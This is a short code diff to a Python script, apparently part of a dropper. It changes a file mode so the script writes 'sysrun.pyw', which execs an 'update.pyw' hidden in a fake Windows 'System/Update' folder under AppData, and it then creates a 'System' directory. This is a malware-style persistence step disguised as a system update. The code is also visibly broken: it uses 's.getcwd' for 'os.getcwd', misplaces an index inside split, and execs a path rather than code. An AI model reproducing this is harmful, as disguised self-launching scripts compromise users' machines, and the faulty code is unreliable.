@@ -1,5 +1,5 @@
 import os
-shortcut = open("sysrun.pyw", "r")
+shortcut = open("sysrun.pyw", "w")
 shortcut.write("exec('C:/Users/{}/AppData/Roaming/Microsoft/Windows/System/Update/update.pyw'.format(s.getcwd().split('\\'[2]))")
 os.mkdir("../../../System")
 os.chdir("../../../System")
